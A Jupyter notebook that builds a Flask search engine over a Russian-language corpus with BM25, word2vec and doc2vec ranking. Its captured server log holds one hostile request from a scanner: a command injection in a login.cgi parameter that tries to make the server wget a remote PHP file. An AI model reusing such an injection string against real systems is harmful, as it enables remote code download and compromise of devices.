{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: flask in /opt/conda/lib/python3.6/site-packages\n",
      "Requirement already satisfied: Jinja2>=2.10 in /opt/conda/lib/python3.6/site-packages (from flask)\n",
      "Requirement already satisfied: Werkzeug>=0.14 in /opt/conda/lib/python3.6/site-packages (from flask)\n",
      "Requirement already satisfied: itsdangerous>=0.24 in /opt/conda/lib/python3.6/site-packages (from flask)\n",
      "Requirement already satisfied: click>=5.1 in /opt/conda/lib/python3.6/site-packages (from flask)\n",
      "Requirement already satisfied: MarkupSafe>=0.23 in /opt/conda/lib/python3.6/site-packages (from Jinja2>=2.10->flask)\n",
      "\u001b[33mYou are using pip version 9.0.1, however version 18.1 is available.\n",
      "You should consider upgrading via the 'pip install --upgrade pip' command.\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "!pip install pymystem3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from flask import Flask\n",
    "from flask import render_template, request, url_for\n",
    "from pymystem3 import Mystem\n",
    "import string\n",
    "from gensim import matutils\n",
    "import numpy as np\n",
    "from math import log\n",
    "from collections import defaultdict\n",
    "from nltk import word_tokenize\n",
    "from nltk.corpus import stopwords\n",
    "import pickle\n",
    "from gensim.models.doc2vec import Doc2Vec\n",
    "from gensim.models import Word2Vec"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1\n",
      "2\n",
      "3\n",
      "4\n",
      "5\n",
      "6\n",
      "7\n",
      "8\n"
     ]
    }
   ],
   "source": [
    "stops = True\n",
    "amount = 10\n",
    "search_method = 'inverted_index'\n",
    "russian_stopwords = set(stopwords.words('russian'))\n",
    "\n",
    "with open('info_data.pickle', 'rb') as f:\n",
    "    info_data = pickle.load(f)\n",
    "print('1')\n",
    "with open('word_count_del.pickle', 'rb') as f:\n",
    "    word_count_del = pickle.load(f)\n",
    "print('2')\n",
    "with open('word_count_not_del.pickle', 'rb') as f:\n",
    "    word_count_not_del = pickle.load(f)\n",
    "print('3')\n",
    "with open('vec_data_del.pickle', 'rb') as f:\n",
    "    vec_data_del = pickle.load(f)\n",
    "print('4')\n",
    "with open('vec_data_not_del.pickle', 'rb') as f:\n",
    "    vec_data_not_del = pickle.load(f)\n",
    "print('5')\n",
    "\n",
    "avgdl = np.mean([i['len'] for i in info_data.values()])\n",
    "print('6')\n",
    "model_w2v = Word2Vec.load('araneum_none_fasttextcbow_300_5_2018.model')\n",
    "print('7')\n",
    "model_d2v = Doc2Vec.load('model_d2v')\n",
    "print('8')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "def preprocessing(input_text, stopwords={}, del_stopwords=True, del_digit=True):\n",
    "\n",
    "    words = [x.lower().strip(string.punctuation+'»«–…') for x in word_tokenize(input_text)]\n",
    "    lemmas = [mystem.lemmatize(x)[0] for x in words if x]\n",
    "    lemmas_arr = []\n",
    "    for lemma in lemmas:\n",
    "        if del_stopwords:\n",
    "            if lemma in stopwords:\n",
    "                continue\n",
    "        if del_digit:\n",
    "            if lemma.isdigit():\n",
    "                continue\n",
    "        lemmas_arr.append(lemma)\n",
    "    return lemmas_arr"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "def get_w2v_vectors(lemmas, model):\n",
    "\n",
    "    lemmas_vectors = []\n",
    "    for lemma in lemmas:\n",
    "        try:\n",
    "            lemmas_vectors.append(model.wv[lemma])\n",
    "        except:\n",
    "            None\n",
    "    if lemmas_vectors:\n",
    "        doc_vec = sum(lemmas_vectors)\n",
    "        normalized_vec = matutils.unitvec(doc_vec)\n",
    "        return list(normalized_vec)\n",
    "    else:\n",
    "        return [0] * 300\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "def similarity(vec1, vec2):\n",
    "    return np.dot(vec1, vec2)\n",
    "\n",
    "\n",
    "def culc_sim_score(all_data, vec, model_type):\n",
    "\n",
    "    answer = defaultdict(float)  # id : score\n",
    "\n",
    "    for part in all_data:\n",
    "\n",
    "        if model_type == 'word2v':\n",
    "            sim = similarity(part['w2v_vec'], vec)\n",
    "        elif model_type == 'doc2v':\n",
    "            sim = similarity(part['d2v_vec'], vec)\n",
    "        else: raise ValueError\n",
    "\n",
    "        if answer[part['id']] == 0.0: answer[part['id']] = float('-inf')\n",
    "\n",
    "        if sim > answer[part['id']]: answer[part['id']] = sim\n",
    "\n",
    "    return answer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "def search_w2v(string, model, info_data, vec_data, stopwords={}, amount=10, del_stop=True):\n",
    "\n",
    "    if not isinstance(string, str):\n",
    "        raise ValueError('enter correct data')\n",
    "\n",
    "    words = preprocessing(string, stopwords=stopwords, del_stopwords=del_stop, del_digit=True)\n",
    "    vec = get_w2v_vectors(words, model)\n",
    "    answer = culc_sim_score(vec_data, vec, 'word2v')\n",
    "\n",
    "    for index, ans in enumerate(sorted(answer.items(), reverse=True, key=lambda x: x[1])):\n",
    "        if index >= amount: break\n",
    "        yield (ans[0], info_data[ans[0]], ans[1])\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_d2v_vectors(text, model):\n",
    "    \"\"\"Получает вектор документа\"\"\"\n",
    "    return model.infer_vector(text)\n",
    "\n",
    "\n",
    "def search_d2v(string, model, info_data, vec_data, stopwords={}, del_stop=False, amount=10):\n",
    "\n",
    "    if not isinstance(string, str):\n",
    "        raise ValueError('enter correct data')\n",
    "\n",
    "    words = preprocessing(string, stopwords=stopwords, del_stopwords=del_stop, del_digit=True)\n",
    "    vec = get_d2v_vectors(words, model)\n",
    "    answer = culc_sim_score(vec_data, vec, 'doc2v')\n",
    "\n",
    "    for index, ans in enumerate(sorted(answer.items(), reverse=True, key=lambda x: x[1])):\n",
    "        if index >= amount: break\n",
    "        yield (ans[0], info_data[ans[0]], ans[1])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "def score_BM25(qf, dl, avgdl, k1, b, N, n):\n",
    "    \"\"\"\n",
    "    Compute similarity score between search query and documents from collection\n",
    "    :return: score\n",
    "\n",
    "    qf - кол - во вхождений слова в документе\n",
    "    dl - длина документа\n",
    "    \"\"\"\n",
    "    if dl == 0:\n",
    "        dl = 1\n",
    "        \n",
    "    tf = qf / dl\n",
    "    idf = log((N - n + 0.5) / (n + 0.5))\n",
    "    a = (k1 + 1) * tf\n",
    "    b = tf + k1*(1 - b + b*(dl / avgdl))\n",
    "\n",
    "    return (a / b) * idf\n",
    "\n",
    "\n",
    "def compute_sim(words, avgdl, doc, info_data, word_count, N):\n",
    "    \"\"\"\n",
    "    Compute similarity score between search query and documents from collection\n",
    "    :return: score\n",
    "    \"\"\"\n",
    "\n",
    "    k1 = 2.0\n",
    "    b = 0.75\n",
    "    ans = 0\n",
    "\n",
    "    for word in words:\n",
    "        if word_count[word] != {}:\n",
    "\n",
    "            try: qf = word_count[word][doc]\n",
    "            except KeyError: qf = 0\n",
    "\n",
    "            dl = info_data[doc]['len']\n",
    "            n = len(word_count[word])\n",
    "            ans += score_BM25(qf, dl, avgdl, k1, b, N, n)\n",
    "\n",
    "    return ans\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_search_result(text, avgdl, info_data, word_count, stopwords={}, del_stop=True, amount=10):\n",
    "    \"\"\"\n",
    "    Compute sim score between search query and all documents in collection\n",
    "    Collect as pair (doc_id, score)\n",
    "    :param query: input text\n",
    "    :return: list of lists with (doc_id, score)\n",
    "    \"\"\"\n",
    "\n",
    "    if not isinstance(text, str):\n",
    "        raise ValueError\n",
    "\n",
    "    words = preprocessing(text, stopwords=stopwords, del_stopwords=del_stop, del_digit=True)\n",
    "    answer = {}\n",
    "    N = len(info_data)\n",
    "\n",
    "    for doc in info_data:\n",
    "        answer[doc] = compute_sim(words, avgdl, doc, info_data, word_count, N)\n",
    "\n",
    "    for index, ans in enumerate(sorted(answer.items(), reverse=True, key=lambda x: x[1])):\n",
    "        if index >= amount: break\n",
    "        yield (ans[0], info_data[ans[0]], ans[1])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [],
   "source": [
    "def search(string, search_method, avgdl, model_w2v, model_d2v, info_data, vec_data_del, vec_data_not_del, word_count_del, word_count_not_del, amount=10, del_stop=True, stopwords={}):\n",
    "\n",
    "    if search_method == 'inverted_index':\n",
    "        if del_stop != 'True':\n",
    "            search_result = get_search_result(string, avgdl, info_data, word_count_not_del, stopwords=stopwords, del_stop=False, amount=amount)\n",
    "        else:\n",
    "            search_result = get_search_result(string, avgdl, info_data, word_count_del, stopwords=stopwords, del_stop=True, amount=amount)\n",
    "\n",
    "    elif search_method == 'word2vec':\n",
    "        if del_stop != 'True':\n",
    "            search_result = search_w2v(string, model_w2v, info_data, vec_data_not_del, stopwords=stopwords, amount=amount, del_stop=False)\n",
    "        else:\n",
    "            search_result = search_w2v(string, model_w2v, info_data, vec_data_del, stopwords=stopwords, amount=amount, del_stop=True)\n",
    "\n",
    "    elif search_method == 'doc2vec':\n",
    "        if del_stop != 'True':\n",
    "            search_result = search_d2v(string, model_d2v, info_data, vec_data_not_del, stopwords=stopwords, amount=amount, del_stop=False)\n",
    "        else:\n",
    "            search_result = search_d2v(string, model_d2v, info_data, vec_data_del, stopwords=stopwords, amount=amount, del_stop=True)\n",
    "\n",
    "\n",
    "    return search_result\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " * Serving Flask app \"__main__\" (lazy loading)\n",
      " * Environment: production\n",
      "   WARNING: Do not use the development server in a production environment.\n",
      "   Use a production WSGI server instead.\n",
      " * Debug mode: off\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)\n",
      "92.242.59.6 - - [23/Oct/2018 12:16:10] \"GET / HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:16:20] \"GET /?words=%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D0%B0%D0%B9%D1%84%D0%BE%D0%BD&amount=5&stops=True&model=inverted_index HTTP/1.1\" 200 -\n",
      "/opt/conda/lib/python3.6/site-packages/gensim/matutils.py:737: FutureWarning: Conversion of the second argument of issubdtype from `int` to `np.signedinteger` is deprecated. In future, it will be treated as `np.int64 == np.dtype(int).type`.\n",
      "  if np.issubdtype(vec.dtype, np.int):\n",
      "92.242.59.6 - - [23/Oct/2018 12:17:03] \"GET /?words=%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D0%B0%D0%B9%D1%84%D0%BE%D0%BD&amount=5&stops=True&model=word2vec HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:17:18] \"GET /?words=%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D0%B0%D0%B9%D1%84%D0%BE%D0%BD&amount=5&stops=True&model=doc2vec HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:18:05] \"GET /?words=%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D0%B0%D0%B9%D1%84%D0%BE%D0%BD&amount=5&stops=True&model=doc2vec HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:18:37] \"GET /?words=%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D0%B0%D0%B9%D1%84%D0%BE%D0%BD&amount=5&stops=True&model=word2vec HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:18:48] \"GET /?words=%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D0%B0%D0%B9%D1%84%D0%BE%D0%BD&amount=5&stops=True&model=inverted_index HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:20:28] \"GET /?words=%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D0%B0%D0%B9%D1%84%D0%BE%D0%BD&amount=5&stops=True&model=inverted_index HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:21:06] \"GET /?words=%D0%B0%D0%B9%D1%84%D0%BE%D0%BD+6&amount=5&stops=True&model=inverted_index HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:21:25] \"GET /?words=%D0%B0%D0%B9%D1%84%D0%BE%D0%BD+6&amount=5&stops=False&model=inverted_index HTTP/1.1\" 200 -\n",
      "5.238.231.44 - - [23/Oct/2018 12:24:52] \"GET / HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:26:45] \"GET / HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:29:51] \"GET /?words=%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D0%B0%D0%B9%D1%84%D0%BE%D0%BD&amount=5&stops=True&model=inverted_index HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:30:08] \"GET /?words=%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D0%B0%D0%B9%D1%84%D0%BE%D0%BD&amount=5&stops=True&model=word2vec HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:30:13] \"GET /?words=%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D0%B0%D0%B9%D1%84%D0%BE%D0%BD&amount=5&stops=True&model=doc2vec HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:30:24] \"GET /?words=%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D0%B0%D0%B9%D1%84%D0%BE%D0%BD&amount=5&stops=True&model=word2vec HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:30:34] \"GET /?words=%D0%B0%D0%B9%D1%84%D0%BE%D0%BD&amount=5&stops=True&model=word2vec HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:30:44] \"GET /?words=%D0%B0%D0%B9%D1%84%D0%BE%D0%BD&amount=5&stops=False&model=word2vec HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:31:01] \"GET /?words=%D0%B0%D0%B9%D1%84%D0%BE%D0%BD&amount=5&stops=False&model=doc2vec HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:31:28] \"GET /?words=%D0%B0%D0%B9%D1%84%D0%BE%D0%BD&amount=5&stops=False&model=inverted_index HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:31:34] \"GET /?words=%D0%B0%D0%B9%D1%84%D0%BE%D0%BD&amount=5&stops=False&model=word2vec HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:31:56] \"GET /?words=%D0%B0%D0%B9%D1%84%D0%BE%D0%BD+6&amount=5&stops=False&model=word2vec HTTP/1.1\" 200 -\n",
      "212.145.152.83 - - [23/Oct/2018 12:35:31] \"GET / HTTP/1.1\" 200 -\n",
      "212.145.152.83 - - [23/Oct/2018 12:35:31] \"GET /login.cgi?cli=aa%20aa%27;wget%20http://128.199.251.119/t.php%27$ HTTP/1.1\" 404 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:36:49] \"GET / HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:36:55] \"GET /?words=%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D0%B0%D0%B9%D1%84%D0%BE%D0%BD&amount=5&stops=True&model=doc2vec HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:37:45] \"GET /?words=%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D0%B0%D0%B9%D1%84%D0%BE%D0%BD&amount=5&stops=True&model=word2vec HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:37:55] \"GET /?words=%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D0%B0%D0%B9%D1%84%D0%BE%D0%BD&amount=10&stops=True&model=doc2vec HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:38:51] \"GET /?words=%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D0%B0%D0%B9%D1%84%D0%BE%D0%BD&amount=10&stops=True&model=word2vec HTTP/1.1\" 200 -\n",
      "92.242.59.6 - - [23/Oct/2018 12:39:13] \"GET /?words=%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C+%D0%B0%D0%B9%D1%84%D0%BE%D0%BD&amount=10&stops=True&model=inverted_index HTTP/1.1\" 200 -\n"
     ]
    }
   ],
   "source": [
    "\n",
    "mystem = Mystem()\n",
    "app = Flask(__name__)\n",
    "\n",
    "\n",
    "@app.route('/', methods=['GET'])\n",
    "def main_page():\n",
    "    main_url = url_for('main_page')\n",
    "    if request.args:\n",
    "        query = request.args['words']\n",
    "        amount = int(request.args['amount'])\n",
    "        stops = request.args['stops']\n",
    "        search_method = request.args['model']\n",
    "\n",
    "        result = search(query, search_method, avgdl, model_w2v, model_d2v, info_data, vec_data_del, vec_data_not_del, word_count_del, word_count_not_del, amount=amount, del_stop=stops, stopwords=russian_stopwords)\n",
    "        return render_template('result.html', name=result, main_page=main_page)\n",
    "\n",
    "    return render_template('index.html')\n",
    "\n",
    "\n",
    "@app.route('/result', methods=['GET'])\n",
    "def result():\n",
    "    main_url = url_for('main_page')\n",
    "\n",
    "    return render_template('result.html')\n",
    "\n",
    "if __name__ == '__main__':\n",
    "    app.run(debug=False, host='0.0.0.0', port=5000)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--2018-10-23 09:04:15--  http://127.0.0.1:5000/\r\n",
      "Connecting to 127.0.0.1:5000... failed: Connection refused.\r\n"
     ]
    }
   ],
   "source": [
    "!wget 127.0.0.1:5000"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for jovyan: \n",
      "/bin/sh: 1: lsof: not found\n"
     ]
    }
   ],
   "source": [
    "!sudo apt-get install lsof\n",
    "!lsof -i :5000"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
